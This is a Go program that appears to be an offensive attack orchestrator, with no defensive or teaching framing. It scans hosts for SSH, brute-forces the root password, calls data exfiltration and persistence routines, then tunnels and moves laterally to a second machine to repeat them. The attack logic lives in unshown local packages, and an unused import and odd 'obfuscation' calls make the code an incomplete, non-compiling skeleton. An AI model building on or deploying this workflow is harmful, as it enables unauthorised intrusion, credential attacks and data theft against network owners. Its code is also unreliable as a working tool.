package main

import (
	"fmt"
	"reconnaissance"
	"exploitation"
	"postexploitation"
	"lateralmovement"
	"golang.org/x/crypto/ssh"
)

func main() {
	fmt.Println("[*] Starting reconnaissance phase...")
	obfuscated_ips := []string{
		reconnaissance.Obfuscate_ip("192.168.1.100"),
		reconnaissance.Obfuscate_ip("192.168.1.101"),
	}
	open_ssh := reconnaissance.Scan_network(obfuscated_ips)
	if len(open_ssh) == 0 {
		fmt.Println("[!] No open SSH ports found. Exiting.")
		return
	}

	fmt.Println("[*] Starting exploitation phase...")
	obfuscated_passwords := []string{
		exploitation.Obfuscate_password("password123"), //example
		exploitation.Obfuscate_password("admin"), //example
		exploitation.Obfuscate_password("root"), //example
	}

	client, err := exploitation.Ssh_brute_force(open_ssh[0], "root", obfuscated_passwords)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer client.Close()

	fmt.Println("[*] Starting post-exploitation phase...")
	postexploitation.Data_exfiltration(client)
	postexploitation.Persistence(client)

	fmt.Println("[*] Starting lateral movement phase...")
	err = lateralmovement.Setup_ssh_tunnel(client, 8080, "192.168.1.105", 22)
	if err != nil {
		fmt.Println("Error setting up tunnel:", err)
		return
	}

	new_client, err := lateralmovement.Move_laterally(client, "192.168.1.105", "root", "password123")
	if err != nil {
		fmt.Println("Error moving laterally:", err)
		return
	}

	postexploitation.Data_exfiltration(new_client)
	postexploitation.Persistence(new_client)
}
